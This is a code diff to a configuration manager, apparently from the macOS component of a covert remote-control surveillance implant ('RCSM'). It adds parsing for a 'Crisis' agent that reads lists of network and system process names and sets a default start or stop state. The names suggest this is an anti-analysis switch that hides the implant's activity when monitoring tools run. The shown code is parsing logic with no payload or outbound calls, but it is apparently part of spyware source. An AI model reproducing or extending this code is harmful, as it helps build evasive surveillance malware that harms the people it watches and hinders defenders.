@@ -11,6 +11,7 @@
 
 #import <CommonCrypto/CommonDigest.h>
 #import <sys/types.h>
+#include <wchar.h>
 
 #import "RCSMConfManager.h"
 #import "RCSMTaskManager.h"
@@ -177,6 +178,110 @@ static int actionCounter = 0;
   return YES;
 }
 
+- (void)initCrisisAgentParamsWithData: (NSData*)aData
+                            andStatus: (UInt32)aStatus
+{
+#ifdef DEBUG_CONF_MANAGER
+  infoLog(@"parse Crisis agent structs core %@", [[NSBundle mainBundle] executablePath]);
+#endif
+  
+  if (gAgentCrisisApp != nil) 
+  {
+    [gAgentCrisisApp release];
+    gAgentCrisisApp = nil;
+  }
+  
+  if (gAgentCrisisNet != nil) 
+  {
+    [gAgentCrisisNet release];
+    gAgentCrisisNet = nil;
+  }
+  
+  crisis_conf_struct *crisis_conf = (crisis_conf_struct *)[aData bytes];
+  
+  char *process_name = crisis_conf->process_names;
+  
+  if (crisis_conf->check_network)
+  {
+    for (int i=0; i<crisis_conf->network_process_count; i++) 
+    {
+      int len = _utf16len((unichar*)process_name)*sizeof(unichar);
+      
+  #ifdef DEBUG_CONF_MANAGER
+      NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
+      
+      infoLog(@"process_name bytes (%@)", tmpD);
+      
+      [tmpD release];
+  #endif
+      
+      NSString *tmpAppName = [[NSString alloc] initWithBytes: process_name 
+                                                      length: len 
+                                                    encoding: NSUTF16LittleEndianStringEncoding];
+      
+  #ifdef DEBUG_CONF_MANAGER
+      infoLog(@"network_process no. %d %@ len (%d)", i, tmpAppName, len);
+  #endif
+      
+      if (gAgentCrisisNet == nil)
+        gAgentCrisisNet = [[NSMutableArray alloc] initWithCapacity: 0];
+      
+      [gAgentCrisisNet addObject: (id)tmpAppName];
+      
+      [tmpAppName release];
+      
+      process_name += (len+sizeof(unichar)); 
+    }
+  }
+  
+  if (crisis_conf->check_system)
+  {
+    for (int i=0; i<crisis_conf->system_process_count; i++) 
+    {
+      int len =_utf16len((unichar*)process_name)*sizeof(unichar);
+      
+  #ifdef DEBUG_CONF_MANAGER
+      NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
+      
+      infoLog(@"process_name bytes (%@)", tmpD);
+      
+      [tmpD release];
+  #endif
+      
+      NSString *tmpAppName = [[NSString alloc] initWithBytes: process_name 
+                                                      length: len 
+                                                    encoding: NSUTF16LittleEndianStringEncoding];
+      if (gAgentCrisisApp == nil)
+        gAgentCrisisApp = [[NSMutableArray alloc] initWithCapacity: 0];
+      
+  #ifdef DEBUG_CONF_MANAGER
+      infoLog(@"system_process no. %d (%@) len (%d)", i, tmpAppName, len);
+  #endif
+      
+      [gAgentCrisisApp addObject: (id)tmpAppName];
+      
+      [tmpAppName release];
+      
+      process_name += (len+sizeof(unichar)); 
+    }
+  }
+  
+  if (aStatus == 0) 
+  {
+#ifdef DEBUG_CONF_MANAGER
+    infoLog(@"Crisis agent stopped by default");
+#endif
+    gAgentCrisis = CRISIS_STOP;
+  }
+  else
+  {
+#ifdef DEBUG_CONF_MANAGER
+    infoLog(@"Crisis agent started by default");
+#endif
+    gAgentCrisis = CRISIS_START;  
+  }
+}
+
 - (BOOL)_parseAgents: (NSData *)aData nTimes: (int)nTimes
 {
   agentStruct *header;
@@ -225,6 +330,11 @@ static int actionCounter = 0;
           //infoLog(@"%@", tempData);
           // Jump to the next event (dataSize + PAD)
           pos += header->internalDataSize + 0xC;
+          
+          // Configure Crisis params
+          if (header->agentID == AGENT_CRISIS)
+            [self initCrisisAgentParamsWithData: tempData
+                                      andStatus: header->status];
           
           [taskManager registerAgent: tempData
                              agentID: header->agentID
@@ -492,9 +602,20 @@ static int actionCounter = 0;
   
   // Exclude sizeof(Final CRC) + sizeof(LEN field)
   endOfConfData = endOfConfData - sizeof(int) * 2;
+  NSData *configurationData = nil;
   
-  NSData *configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
-                                                                           endOfConfData)];
+  @try
+    {
+      configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
+                                                                       endOfConfData)];
+    }
+  @catch (NSException *e)
+    {
+#ifdef DEBUG_CONF_MANAGER
+      errorLog(@"exception on configData makerange (%@)", [e reason]);
+#endif
+    }
+
   
   u_long pos = 0;
   
